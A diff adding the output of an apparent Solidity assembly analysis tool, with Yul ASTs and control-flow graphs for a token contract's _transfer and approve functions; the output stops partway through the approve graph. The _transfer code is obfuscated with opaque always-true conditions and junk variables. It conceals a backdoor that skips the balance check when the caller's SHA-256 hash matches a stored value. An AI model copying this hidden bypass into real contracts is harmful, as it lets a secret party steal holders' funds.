@@ -1,0 +1,932 @@
+INFO:AssemblyAstCfg:Input Solidity source only
+INFO:AssemblyAstCfg:InlineAssembly blocks 3
+
+AssemblyBlock 1
+  Contract: Token
+  Function: _transfer(address _from, address _to, uint256 _amount)
+  Visibility: internal
+  SoliditySourceRange: 2079:1763:0 (line 66:9 to 115:9)
+  YulRoot: YulBlock [2088:1754:0]
+  SoliditySnippet:
+    assembly {
+                if iszero(_from) {
+                    let g4u8ssg := gasprice()
+                    pop(0)
+                    if iszero(sub(g4u8ssg, g4u8ssg)) {
+                        revert(0, 0)
+                    }
+                }
+                if iszero(_to) {
+                    let o162fj9 := origin()
+                    let g7ncimt := gas()
+                    if iszero(xor(o162fj9, o162fj9)) {
+                        revert(0, 0)
+                    }
+                }
+                let QtPD := mload(0x40)
+                mstore(QtPD, _from)
+                mstore(add(QtPD, 32), 0)
+                let iVrp := keccak256(QtPD, 64)
+                let JcxQ := sload(iVrp)
+                let RuhS := sload(yaBW.slot)
+                let t2uiycf := timestamp()
+                pop(0)
+                pop(iszero(1))
+                if eq(t2uiycf, and(t2uiycf, t2uiycf)) {
+                    mstore(QtPD, shl(96, caller()))
+                }
+                if iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32)) {
+                    revert(0, 0)
+                }
+                let SUpo := mload(QtPD)
+                if iszero(eq(RuhS, SUpo)) {
+                    if lt(JcxQ, _amount) {
+                        let g804ngg := gasprice()
+                        let n3yv2qk := number()
+                        pop(0)
+                        if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)) {
+                            revert(0, 0)
+                        }
+                    }
+                }
+                sstore(iVrp, sub(JcxQ, _amount))
+                mstore(QtPD, _to)
+                mstore(add(QtPD, 32), 0)
+                let OBse := keccak256(QtPD, 64)
+                let mVat := sload(OBse)
+                sstore(OBse, add(mVat, _amount))
+                mstore(QtPD, _amount)
+                log3(QtPD, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+            }
+  YulAst:
+    - YulBlock: YulBlock [2088:1754:0]
+      - YulIf: if iszero(_from) [2102:199:0]
+        - YulFunctionCall: YulFunctionCall [2105:13:0]
+          - YulIdentifier: YulIdentifier [2105:6:0]
+          - YulIdentifier: YulIdentifier [2112:5:0]
+        - YulBlock: YulBlock [2119:182:0]
+          - YulVariableDeclaration: let g4u8ssg := gasprice() [2137:25:0]
+            - YulTypedName: YulTypedName [2141:7:0]
+            - YulFunctionCall: YulFunctionCall [2152:10:0]
+              - YulIdentifier: YulIdentifier [2152:8:0]
+          - YulExpressionStatement: pop(0) [2179:6:0]
+            - YulFunctionCall: YulFunctionCall [2179:6:0]
+              - YulIdentifier: YulIdentifier [2179:3:0]
+              - YulLiteral: YulLiteral [2183:1:0]
+          - YulIf: if iszero(sub(g4u8ssg, g4u8ssg)) [2202:85:0]
+            - YulFunctionCall: YulFunctionCall [2205:29:0]
+              - YulIdentifier: YulIdentifier [2205:6:0]
+              - YulFunctionCall: YulFunctionCall [2212:21:0]
+                - ...
+            - YulBlock: YulBlock [2235:52:0]
+              - YulExpressionStatement: revert(0, 0) [2257:12:0]
+                - ...
+      - YulIf: if iszero(_to) [2314:209:0]
+        - YulFunctionCall: YulFunctionCall [2317:11:0]
+          - YulIdentifier: YulIdentifier [2317:6:0]
+          - YulIdentifier: YulIdentifier [2324:3:0]
+        - YulBlock: YulBlock [2329:194:0]
+          - YulVariableDeclaration: let o162fj9 := origin() [2347:23:0]
+            - YulTypedName: YulTypedName [2351:7:0]
+            - YulFunctionCall: YulFunctionCall [2362:8:0]
+              - YulIdentifier: YulIdentifier [2362:6:0]
+          - YulVariableDeclaration: let g7ncimt := gas() [2387:20:0]
+            - YulTypedName: YulTypedName [2391:7:0]
+            - YulFunctionCall: YulFunctionCall [2402:5:0]
+              - YulIdentifier: YulIdentifier [2402:3:0]
+          - YulIf: if iszero(xor(o162fj9, o162fj9)) [2424:85:0]
+            - YulFunctionCall: YulFunctionCall [2427:29:0]
+              - YulIdentifier: YulIdentifier [2427:6:0]
+              - YulFunctionCall: YulFunctionCall [2434:21:0]
+                - ...
+            - YulBlock: YulBlock [2457:52:0]
+              - YulExpressionStatement: revert(0, 0) [2479:12:0]
+                - ...
+      - YulVariableDeclaration: let QtPD := mload(0x40) [2536:23:0]
+        - YulTypedName: YulTypedName [2540:4:0]
+        - YulFunctionCall: YulFunctionCall [2548:11:0]
+          - YulIdentifier: YulIdentifier [2548:5:0]
+          - YulLiteral: YulLiteral [2554:4:0]
+      - YulExpressionStatement: mstore(QtPD, _from) [2572:19:0]
+        - YulFunctionCall: YulFunctionCall [2572:19:0]
+          - YulIdentifier: YulIdentifier [2572:6:0]
+          - YulIdentifier: YulIdentifier [2579:4:0]
+          - YulIdentifier: YulIdentifier [2585:5:0]
+      - YulExpressionStatement: mstore(add(QtPD, 32), 0) [2604:24:0]
+        - YulFunctionCall: YulFunctionCall [2604:24:0]
+          - YulIdentifier: YulIdentifier [2604:6:0]
+          - YulFunctionCall: YulFunctionCall [2611:13:0]
+            - YulIdentifier: YulIdentifier [2611:3:0]
+            - YulIdentifier: YulIdentifier [2615:4:0]
+            - YulLiteral: YulLiteral [2621:2:0]
+          - YulLiteral: YulLiteral [2626:1:0]
+      - YulVariableDeclaration: let iVrp := keccak256(QtPD, 64) [2641:31:0]
+        - YulTypedName: YulTypedName [2645:4:0]
+        - YulFunctionCall: YulFunctionCall [2653:19:0]
+          - YulIdentifier: YulIdentifier [2653:9:0]
+          - YulIdentifier: YulIdentifier [2663:4:0]
+          - YulLiteral: YulLiteral [2669:2:0]
+      - YulVariableDeclaration: let JcxQ := sload(iVrp) [2685:23:0]
+        - YulTypedName: YulTypedName [2689:4:0]
+        - YulFunctionCall: YulFunctionCall [2697:11:0]
+          - YulIdentifier: YulIdentifier [2697:5:0]
+          - YulIdentifier: YulIdentifier [2703:4:0]
+      - YulVariableDeclaration: let RuhS := sload(yaBW.slot) [2721:28:0]
+        - YulTypedName: YulTypedName [2725:4:0]
+        - YulFunctionCall: YulFunctionCall [2733:16:0]
+          - YulIdentifier: YulIdentifier [2733:5:0]
+          - YulIdentifier: YulIdentifier [2739:9:0]
+      - YulVariableDeclaration: let t2uiycf := timestamp() [2762:26:0]
+        - YulTypedName: YulTypedName [2766:7:0]
+        - YulFunctionCall: YulFunctionCall [2777:11:0]
+          - YulIdentifier: YulIdentifier [2777:9:0]
+      - YulExpressionStatement: pop(0) [2801:6:0]
+        - YulFunctionCall: YulFunctionCall [2801:6:0]
+          - YulIdentifier: YulIdentifier [2801:3:0]
+          - YulLiteral: YulLiteral [2805:1:0]
+      - YulExpressionStatement: pop(iszero(1)) [2820:14:0]
+        - YulFunctionCall: YulFunctionCall [2820:14:0]
+          - YulIdentifier: YulIdentifier [2820:3:0]
+          - YulFunctionCall: YulFunctionCall [2824:9:0]
+            - YulIdentifier: YulIdentifier [2824:6:0]
+            - YulLiteral: YulLiteral [2831:1:0]
+      - YulIf: if eq(t2uiycf, and(t2uiycf, t2uiycf)) [2847:101:0]
+        - YulFunctionCall: YulFunctionCall [2850:34:0]
+          - YulIdentifier: YulIdentifier [2850:2:0]
+          - YulIdentifier: YulIdentifier [2853:7:0]
+          - YulFunctionCall: YulFunctionCall [2862:21:0]
+            - YulIdentifier: YulIdentifier [2862:3:0]
+            - YulIdentifier: YulIdentifier [2866:7:0]
+            - YulIdentifier: YulIdentifier [2875:7:0]
+        - YulBlock: YulBlock [2885:63:0]
+          - YulExpressionStatement: mstore(QtPD, shl(96, caller())) [2903:31:0]
+            - YulFunctionCall: YulFunctionCall [2903:31:0]
+              - YulIdentifier: YulIdentifier [2903:6:0]
+              - YulIdentifier: YulIdentifier [2910:4:0]
+              - YulFunctionCall: YulFunctionCall [2916:17:0]
+                - ...
+      - YulIf: if iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32)) [2961:96:0]
+        - YulFunctionCall: YulFunctionCall [2964:48:0]
+          - YulIdentifier: YulIdentifier [2964:6:0]
+          - YulFunctionCall: YulFunctionCall [2971:40:0]
+            - YulIdentifier: YulIdentifier [2971:10:0]
+            - YulFunctionCall: YulFunctionCall [2982:5:0]
+              - YulIdentifier: YulIdentifier [2982:3:0]
+            - YulLiteral: YulLiteral [2989:1:0]
+            - YulIdentifier: YulIdentifier [2992:4:0]
+            - YulLiteral: YulLiteral [2998:2:0]
+            - YulIdentifier: YulIdentifier [3002:4:0]
+            - YulLiteral: YulLiteral [3008:2:0]
+        - YulBlock: YulBlock [3013:44:0]
+          - YulExpressionStatement: revert(0, 0) [3031:12:0]
+            - YulFunctionCall: YulFunctionCall [3031:12:0]
+              - YulIdentifier: YulIdentifier [3031:6:0]
+              - YulLiteral: YulLiteral [3038:1:0]
+              - YulLiteral: YulLiteral [3041:1:0]
+      - YulVariableDeclaration: let SUpo := mload(QtPD) [3070:23:0]
+        - YulTypedName: YulTypedName [3074:4:0]
+        - YulFunctionCall: YulFunctionCall [3082:11:0]
+          - YulIdentifier: YulIdentifier [3082:5:0]
+          - YulIdentifier: YulIdentifier [3088:4:0]
+      - YulIf: if iszero(eq(RuhS, SUpo)) [3106:348:0]
+        - YulFunctionCall: YulFunctionCall [3109:22:0]
+          - YulIdentifier: YulIdentifier [3109:6:0]
+          - YulFunctionCall: YulFunctionCall [3116:14:0]
+            - YulIdentifier: YulIdentifier [3116:2:0]
+            - YulIdentifier: YulIdentifier [3119:4:0]
+            - YulIdentifier: YulIdentifier [3125:4:0]
+        - YulBlock: YulBlock [3132:322:0]
+          - YulIf: if lt(JcxQ, _amount) [3150:290:0]
+            - YulFunctionCall: YulFunctionCall [3153:17:0]
+              - YulIdentifier: YulIdentifier [3153:2:0]
+              - YulIdentifier: YulIdentifier [3156:4:0]
+              - YulIdentifier: YulIdentifier [3162:7:0]
+            - YulBlock: YulBlock [3171:269:0]
+              - YulVariableDeclaration: let g804ngg := gasprice() [3193:25:0]
+                - ...
+              - YulVariableDeclaration: let n3yv2qk := number() [3239:23:0]
+                - ...
+              - YulExpressionStatement: pop(0) [3283:6:0]
+                - ...
+              - YulIf: if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)) [3310:112:0]
+                - ...
+      - YulExpressionStatement: sstore(iVrp, sub(JcxQ, _amount)) [3467:32:0]
+        - YulFunctionCall: YulFunctionCall [3467:32:0]
+          - YulIdentifier: YulIdentifier [3467:6:0]
+          - YulIdentifier: YulIdentifier [3474:4:0]
+          - YulFunctionCall: YulFunctionCall [3480:18:0]
+            - YulIdentifier: YulIdentifier [3480:3:0]
+            - YulIdentifier: YulIdentifier [3484:4:0]
+            - YulIdentifier: YulIdentifier [3490:7:0]
+      - YulExpressionStatement: mstore(QtPD, _to) [3512:17:0]
+        - YulFunctionCall: YulFunctionCall [3512:17:0]
+          - YulIdentifier: YulIdentifier [3512:6:0]
+          - YulIdentifier: YulIdentifier [3519:4:0]
+          - YulIdentifier: YulIdentifier [3525:3:0]
+      - YulExpressionStatement: mstore(add(QtPD, 32), 0) [3542:24:0]
+        - YulFunctionCall: YulFunctionCall [3542:24:0]
+          - YulIdentifier: YulIdentifier [3542:6:0]
+          - YulFunctionCall: YulFunctionCall [3549:13:0]
+            - YulIdentifier: YulIdentifier [3549:3:0]
+            - YulIdentifier: YulIdentifier [3553:4:0]
+            - YulLiteral: YulLiteral [3559:2:0]
+          - YulLiteral: YulLiteral [3564:1:0]
+      - YulVariableDeclaration: let OBse := keccak256(QtPD, 64) [3579:31:0]
+        - YulTypedName: YulTypedName [3583:4:0]
+        - YulFunctionCall: YulFunctionCall [3591:19:0]
+          - YulIdentifier: YulIdentifier [3591:9:0]
+          - YulIdentifier: YulIdentifier [3601:4:0]
+          - YulLiteral: YulLiteral [3607:2:0]
+      - YulVariableDeclaration: let mVat := sload(OBse) [3623:23:0]
+        - YulTypedName: YulTypedName [3627:4:0]
+        - YulFunctionCall: YulFunctionCall [3635:11:0]
+          - YulIdentifier: YulIdentifier [3635:5:0]
+          - YulIdentifier: YulIdentifier [3641:4:0]
+      - YulExpressionStatement: sstore(OBse, add(mVat, _amount)) [3659:32:0]
+        - YulFunctionCall: YulFunctionCall [3659:32:0]
+          - YulIdentifier: YulIdentifier [3659:6:0]
+          - YulIdentifier: YulIdentifier [3666:4:0]
+          - YulFunctionCall: YulFunctionCall [3672:18:0]
+            - YulIdentifier: YulIdentifier [3672:3:0]
+            - YulIdentifier: YulIdentifier [3676:4:0]
+            - YulIdentifier: YulIdentifier [3682:7:0]
+      - YulExpressionStatement: mstore(QtPD, _amount) [3704:21:0]
+        - YulFunctionCall: YulFunctionCall [3704:21:0]
+          - YulIdentifier: YulIdentifier [3704:6:0]
+          - YulIdentifier: YulIdentifier [3711:4:0]
+          - YulIdentifier: YulIdentifier [3717:7:0]
+      - YulExpressionStatement: log3(QtPD, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to) [3738:94:0]
+        - YulFunctionCall: YulFunctionCall [3738:94:0]
+          - YulIdentifier: YulIdentifier [3738:4:0]
+          - YulIdentifier: YulIdentifier [3743:4:0]
+          - YulLiteral: YulLiteral [3749:2:0]
+          - YulLiteral: YulLiteral [3753:66:0]
+          - YulIdentifier: YulIdentifier [3821:5:0]
+          - YulIdentifier: YulIdentifier [3828:3:0]
+  LocalCFG:
+    Nodes:
+      N0 [entry] entry
+      N1 [exit] exit
+      N2 [condition] if iszero(_from) @ 2102:199:0 (line 67:13)
+      N3 [merge] if merge @ 2102:199:0 (line 67:13)
+      N4 [statement] let g4u8ssg := gasprice() @ 2137:25:0 (line 68:17)
+      N5 [statement] pop(0) @ 2179:6:0 (line 69:17)
+      N6 [condition] if iszero(sub(g4u8ssg, g4u8ssg)) @ 2202:85:0 (line 70:17)
+      N7 [merge] if merge @ 2202:85:0 (line 70:17)
+      N8 [terminal] revert(0, 0) @ 2257:12:0 (line 71:21)
+      N9 [condition] if iszero(_to) @ 2314:209:0 (line 74:13)
+      N10 [merge] if merge @ 2314:209:0 (line 74:13)
+      N11 [statement] let o162fj9 := origin() @ 2347:23:0 (line 75:17)
+      N12 [statement] let g7ncimt := gas() @ 2387:20:0 (line 76:17)
+      N13 [condition] if iszero(xor(o162fj9, o162fj9)) @ 2424:85:0 (line 77:17)
+      N14 [merge] if merge @ 2424:85:0 (line 77:17)
+      N15 [terminal] revert(0, 0) @ 2479:12:0 (line 78:21)
+      N16 [statement] let QtPD := mload(0x40) @ 2536:23:0 (line 81:13)
+      N17 [statement] mstore(QtPD, _from) @ 2572:19:0 (line 82:13)
+      N18 [statement] mstore(add(QtPD, 32), 0) @ 2604:24:0 (line 83:13)
+      N19 [statement] let iVrp := keccak256(QtPD, 64) @ 2641:31:0 (line 84:13)
+      N20 [statement] let JcxQ := sload(iVrp) @ 2685:23:0 (line 85:13)
+      N21 [statement] let RuhS := sload(yaBW.slot) @ 2721:28:0 (line 86:13)
+      N22 [statement] let t2uiycf := timestamp() @ 2762:26:0 (line 87:13)
+      N23 [statement] pop(0) @ 2801:6:0 (line 88:13)
+      N24 [statement] pop(iszero(1)) @ 2820:14:0 (line 89:13)
+      N25 [condition] if eq(t2uiycf, and(t2uiycf, t2uiycf)) @ 2847:101:0 (line 90:13)
+      N26 [merge] if merge @ 2847:101:0 (line 90:13)
+      N27 [statement] mstore(QtPD, shl(96, caller())) @ 2903:31:0 (line 91:17)
+      N28 [condition] if iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32)) @ 2961:96:0 (line 93:13)
+      N29 [merge] if merge @ 2961:96:0 (line 93:13)
+      N30 [terminal] revert(0, 0) @ 3031:12:0 (line 94:17)
+      N31 [statement] let SUpo := mload(QtPD) @ 3070:23:0 (line 96:13)
+      N32 [condition] if iszero(eq(RuhS, SUpo)) @ 3106:348:0 (line 97:13)
+      N33 [merge] if merge @ 3106:348:0 (line 97:13)
+      N34 [condition] if lt(JcxQ, _amount) @ 3150:290:0 (line 98:17)
+      N35 [merge] if merge @ 3150:290:0 (line 98:17)
+      N36 [statement] let g804ngg := gasprice() @ 3193:25:0 (line 99:21)
+      N37 [statement] let n3yv2qk := number() @ 3239:23:0 (line 100:21)
+      N38 [statement] pop(0) @ 3283:6:0 (line 101:21)
+      N39 [condition] if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)) @ 3310:112:0 (line 102:21)
+      N40 [merge] if merge @ 3310:112:0 (line 102:21)
+      N41 [terminal] revert(0, 0) @ 3388:12:0 (line 103:25)
+      N42 [statement] sstore(iVrp, sub(JcxQ, _amount)) @ 3467:32:0 (line 107:13)
+      N43 [statement] mstore(QtPD, _to) @ 3512:17:0 (line 108:13)
+      N44 [statement] mstore(add(QtPD, 32), 0) @ 3542:24:0 (line 109:13)
+      N45 [statement] let OBse := keccak256(QtPD, 64) @ 3579:31:0 (line 110:13)
+      N46 [statement] let mVat := sload(OBse) @ 3623:23:0 (line 111:13)
+      N47 [statement] sstore(OBse, add(mVat, _amount)) @ 3659:32:0 (line 112:13)
+      N48 [statement] mstore(QtPD, _amount) @ 3704:21:0 (line 113:13)
+      N49 [statement] log3(QtPD, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to) @ 3738:94:0 (line 114:13)
+    Edges:
+      N0 --[next]--> N2
+      N2 --[true: iszero(_from)]--> N4
+      N4 --[next]--> N5
+      N5 --[next]--> N6
+      N6 --[true: iszero(sub(g4u8ssg, g4u8ssg))]--> N8
+      N8 --[terminate: revert]--> N1
+      N6 --[false: !(iszero(sub(g4u8ssg, g4u8ssg)))]--> N7
+      N7 --[next]--> N3
+      N2 --[false: !(iszero(_from))]--> N3
+      N3 --[next]--> N9
+      N9 --[true: iszero(_to)]--> N11
+      N11 --[next]--> N12
+      N12 --[next]--> N13
+      N13 --[true: iszero(xor(o162fj9, o162fj9))]--> N15
+      N15 --[terminate: revert]--> N1
+      N13 --[false: !(iszero(xor(o162fj9, o162fj9)))]--> N14
+      N14 --[next]--> N10
+      N9 --[false: !(iszero(_to))]--> N10
+      N10 --[next]--> N16
+      N16 --[next]--> N17
+      N17 --[next]--> N18
+      N18 --[next]--> N19
+      N19 --[next]--> N20
+      N20 --[next]--> N21
+      N21 --[next]--> N22
+      N22 --[next]--> N23
+      N23 --[next]--> N24
+      N24 --[next]--> N25
+      N25 --[true: eq(t2uiycf, and(t2uiycf, t2uiycf))]--> N27
+      N27 --[next]--> N26
+      N25 --[false: !(eq(t2uiycf, and(t2uiycf, t2uiycf)))]--> N26
+      N26 --[next]--> N28
+      N28 --[true: iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32))]--> N30
+      N30 --[terminate: revert]--> N1
+      N28 --[false: !(iszero(staticcall(gas(), 2, QtPD, 20, QtPD, 32)))]--> N29
+      N29 --[next]--> N31
+      N31 --[next]--> N32
+      N32 --[true: iszero(eq(RuhS, SUpo))]--> N34
+      N34 --[true: lt(JcxQ, _amount)]--> N36
+      N36 --[next]--> N37
+      N37 --[next]--> N38
+      N38 --[next]--> N39
+      N39 --[true: eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg))]--> N41
+      N41 --[terminate: revert]--> N1
+      N39 --[false: !(eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)))]--> N40
+      N40 --[next]--> N35
+      N34 --[false: !(lt(JcxQ, _amount))]--> N35
+      N35 --[next]--> N33
+      N32 --[false: !(iszero(eq(RuhS, SUpo)))]--> N33
+      N33 --[next]--> N42
+      N42 --[next]--> N43
+      N43 --[next]--> N44
+      N44 --[next]--> N45
+      N45 --[next]--> N46
+      N46 --[next]--> N47
+      N47 --[next]--> N48
+      N48 --[next]--> N49
+      N49 --[next]--> N1
+
+AssemblyBlock 2
+  Contract: Token
+  Function: approve(address _spender, uint256 _amount)
+  Visibility: public
+  SoliditySourceRange: 3946:996:0 (line 119:9 to 145:9)
+  YulRoot: YulBlock [3955:987:0]
+  SoliditySnippet:
+    assembly {
+                let QtPD := mload(0x40)
+                let gcf9eyl := gasprice()
+                let ba6yh8v := basefee()
+                pop(0)
+                pop(iszero(1))
+                if eq(gcf9eyl, add(gcf9eyl, 0)) {
+                    mstore(QtPD, caller())
+                    mstore(add(QtPD, 0x20), BVNo.slot)
+                }
+                let IIqZ := keccak256(QtPD, 0x40)
+                let o6aj6v4 := origin()
+                let oaugsdm := origin()
+                pop(0)
+                pop(iszero(1))
+                if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) {
+                    mstore(QtPD, _spender)
+                    mstore(add(QtPD, 0x20), IIqZ)
+                }
+                let rTjz := keccak256(QtPD, 0x40)
+                let o7x1j6d := origin()
+                if iszero(sub(o7x1j6d, o7x1j6d)) {
+                    sstore(rTjz, _amount)
+                    log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+                    mstore(QtPD, _amount)
+                }
+            }
+  YulAst:
+    - YulBlock: YulBlock [3955:987:0]
+      - YulVariableDeclaration: let QtPD := mload(0x40) [3969:23:0]
+        - YulTypedName: YulTypedName [3973:4:0]
+        - YulFunctionCall: YulFunctionCall [3981:11:0]
+          - YulIdentifier: YulIdentifier [3981:5:0]
+          - YulLiteral: YulLiteral [3987:4:0]
+      - YulVariableDeclaration: let gcf9eyl := gasprice() [4005:25:0]
+        - YulTypedName: YulTypedName [4009:7:0]
+        - YulFunctionCall: YulFunctionCall [4020:10:0]
+          - YulIdentifier: YulIdentifier [4020:8:0]
+      - YulVariableDeclaration: let ba6yh8v := basefee() [4043:24:0]
+        - YulTypedName: YulTypedName [4047:7:0]
+        - YulFunctionCall: YulFunctionCall [4058:9:0]
+          - YulIdentifier: YulIdentifier [4058:7:0]
+      - YulExpressionStatement: pop(0) [4080:6:0]
+        - YulFunctionCall: YulFunctionCall [4080:6:0]
+          - YulIdentifier: YulIdentifier [4080:3:0]
+          - YulLiteral: YulLiteral [4084:1:0]
+      - YulExpressionStatement: pop(iszero(1)) [4099:14:0]
+        - YulFunctionCall: YulFunctionCall [4099:14:0]
+          - YulIdentifier: YulIdentifier [4099:3:0]
+          - YulFunctionCall: YulFunctionCall [4103:9:0]
+            - YulIdentifier: YulIdentifier [4103:6:0]
+            - YulLiteral: YulLiteral [4110:1:0]
+      - YulIf: if eq(gcf9eyl, add(gcf9eyl, 0)) [4126:137:0]
+        - YulFunctionCall: YulFunctionCall [4129:28:0]
+          - YulIdentifier: YulIdentifier [4129:2:0]
+          - YulIdentifier: YulIdentifier [4132:7:0]
+          - YulFunctionCall: YulFunctionCall [4141:15:0]
+            - YulIdentifier: YulIdentifier [4141:3:0]
+            - YulIdentifier: YulIdentifier [4145:7:0]
+            - YulLiteral: YulLiteral [4154:1:0]
+        - YulBlock: YulBlock [4158:105:0]
+          - YulExpressionStatement: mstore(QtPD, caller()) [4176:22:0]
+            - YulFunctionCall: YulFunctionCall [4176:22:0]
+              - YulIdentifier: YulIdentifier [4176:6:0]
+              - YulIdentifier: YulIdentifier [4183:4:0]
+              - YulFunctionCall: YulFunctionCall [4189:8:0]
+                - ...
+          - YulExpressionStatement: mstore(add(QtPD, 0x20), BVNo.slot) [4215:34:0]
+            - YulFunctionCall: YulFunctionCall [4215:34:0]
+              - YulIdentifier: YulIdentifier [4215:6:0]
+              - YulFunctionCall: YulFunctionCall [4222:15:0]
+                - ...
+              - YulIdentifier: YulIdentifier [4239:9:0]
+      - YulVariableDeclaration: let IIqZ := keccak256(QtPD, 0x40) [4276:33:0]
+        - YulTypedName: YulTypedName [4280:4:0]
+        - YulFunctionCall: YulFunctionCall [4288:21:0]
+          - YulIdentifier: YulIdentifier [4288:9:0]
+          - YulIdentifier: YulIdentifier [4298:4:0]
+          - YulLiteral: YulLiteral [4304:4:0]
+      - YulVariableDeclaration: let o6aj6v4 := origin() [4322:23:0]
+        - YulTypedName: YulTypedName [4326:7:0]
+        - YulFunctionCall: YulFunctionCall [4337:8:0]
+          - YulIdentifier: YulIdentifier [4337:6:0]
+      - YulVariableDeclaration: let oaugsdm := origin() [4358:23:0]
+        - YulTypedName: YulTypedName [4362:7:0]
+        - YulFunctionCall: YulFunctionCall [4373:8:0]
+          - YulIdentifier: YulIdentifier [4373:6:0]
+      - YulExpressionStatement: pop(0) [4394:6:0]
+        - YulFunctionCall: YulFunctionCall [4394:6:0]
+          - YulIdentifier: YulIdentifier [4394:3:0]
+          - YulLiteral: YulLiteral [4398:1:0]
+      - YulExpressionStatement: pop(iszero(1)) [4413:14:0]
+        - YulFunctionCall: YulFunctionCall [4413:14:0]
+          - YulIdentifier: YulIdentifier [4413:3:0]
+          - YulFunctionCall: YulFunctionCall [4417:9:0]
+            - YulIdentifier: YulIdentifier [4417:6:0]
+            - YulLiteral: YulLiteral [4424:1:0]
+      - YulIf: if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) [4440:152:0]
+        - YulFunctionCall: YulFunctionCall [4443:48:0]
+          - YulIdentifier: YulIdentifier [4443:2:0]
+          - YulFunctionCall: YulFunctionCall [4446:21:0]
+            - YulIdentifier: YulIdentifier [4446:3:0]
+            - YulIdentifier: YulIdentifier [4450:7:0]
+            - YulIdentifier: YulIdentifier [4459:7:0]
+          - YulFunctionCall: YulFunctionCall [4469:21:0]
+            - YulIdentifier: YulIdentifier [4469:3:0]
+            - YulIdentifier: YulIdentifier [4473:7:0]
+            - YulIdentifier: YulIdentifier [4482:7:0]
+        - YulBlock: YulBlock [4492:100:0]
+          - YulExpressionStatement: mstore(QtPD, _spender) [4510:22:0]
+            - YulFunctionCall: YulFunctionCall [4510:22:0]
+              - YulIdentifier: YulIdentifier [4510:6:0]
+              - YulIdentifier: YulIdentifier [4517:4:0]
+              - YulIdentifier: YulIdentifier [4523:8:0]
+          - YulExpressionStatement: mstore(add(QtPD, 0x20), IIqZ) [4549:29:0]
+            - YulFunctionCall: YulFunctionCall [4549:29:0]
+              - YulIdentifier: YulIdentifier [4549:6:0]
+              - YulFunctionCall: YulFunctionCall [4556:15:0]
+                - ...
+              - YulIdentifier: YulIdentifier [4573:4:0]
+      - YulVariableDeclaration: let rTjz := keccak256(QtPD, 0x40) [4605:33:0]
+        - YulTypedName: YulTypedName [4609:4:0]
+        - YulFunctionCall: YulFunctionCall [4617:21:0]
+          - YulIdentifier: YulIdentifier [4617:9:0]
+          - YulIdentifier: YulIdentifier [4627:4:0]
+          - YulLiteral: YulLiteral [4633:4:0]
+      - YulVariableDeclaration: let o7x1j6d := origin() [4651:23:0]
+        - YulTypedName: YulTypedName [4655:7:0]
+        - YulFunctionCall: YulFunctionCall [4666:8:0]
+          - YulIdentifier: YulIdentifier [4666:6:0]
+      - YulIf: if iszero(sub(o7x1j6d, o7x1j6d)) [4687:245:0]
+        - YulFunctionCall: YulFunctionCall [4690:29:0]
+          - YulIdentifier: YulIdentifier [4690:6:0]
+          - YulFunctionCall: YulFunctionCall [4697:21:0]
+            - YulIdentifier: YulIdentifier [4697:3:0]
+            - YulIdentifier: YulIdentifier [4701:7:0]
+            - YulIdentifier: YulIdentifier [4710:7:0]
+        - YulBlock: YulBlock [4720:212:0]
+          - YulExpressionStatement: sstore(rTjz, _amount) [4738:21:0]
+            - YulFunctionCall: YulFunctionCall [4738:21:0]
+              - YulIdentifier: YulIdentifier [4738:6:0]
+              - YulIdentifier: YulIdentifier [4745:4:0]
+              - YulIdentifier: YulIdentifier [4751:7:0]
+          - YulExpressionStatement: log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender) [4776:104:0]
+            - YulFunctionCall: YulFunctionCall [4776:104:0]
+              - YulIdentifier: YulIdentifier [4776:4:0]
+              - YulIdentifier: YulIdentifier [4781:4:0]
+              - YulLiteral: YulLiteral [4787:4:0]
+              - YulLiteral: YulLiteral [4793:66:0]
+              - YulFunctionCall: YulFunctionCall [4861:8:0]
+                - ...
+              - YulIdentifier: YulIdentifier [4871:8:0]
+          - YulExpressionStatement: mstore(QtPD, _amount) [4897:21:0]
+            - YulFunctionCall: YulFunctionCall [4897:21:0]
+              - YulIdentifier: YulIdentifier [4897:6:0]
+              - YulIdentifier: YulIdentifier [4904:4:0]
+              - YulIdentifier: YulIdentifier [4910:7:0]
+  LocalCFG:
+    Nodes:
+      N0 [entry] entry
+      N1 [exit] exit
+      N2 [statement] let QtPD := mload(0x40) @ 3969:23:0 (line 120:13)
+      N3 [statement] let gcf9eyl := gasprice() @ 4005:25:0 (line 121:13)
+      N4 [statement] let ba6yh8v := basefee() @ 4043:24:0 (line 122:13)
+      N5 [statement] pop(0) @ 4080:6:0 (line 123:13)
+      N6 [statement] pop(iszero(1)) @ 4099:14:0 (line 124:13)
+      N7 [condition] if eq(gcf9eyl, add(gcf9eyl, 0)) @ 4126:137:0 (line 125:13)
+      N8 [merge] if merge @ 4126:137:0 (line 125:13)
+      N9 [statement] mstore(QtPD, caller()) @ 4176:22:0 (line 126:17)
+      N10 [statement] mstore(add(QtPD, 0x20), BVNo.slot) @ 4215:34:0 (line 127:17)
+      N11 [statement] let IIqZ := keccak256(QtPD, 0x40) @ 4276:33:0 (line 129:13)
+      N12 [statement] let o6aj6v4 := origin() @ 4322:23:0 (line 130:13)
+      N13 [statement] let oaugsdm := origin() @ 4358:23:0 (line 131:13)
+      N14 [statement] pop(0) @ 4394:6:0 (line 132:13)
+      N15 [statement] pop(iszero(1)) @ 4413:14:0 (line 133:13)
+      N16 [condition] if eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)) @ 4440:152:0 (line 134:13)
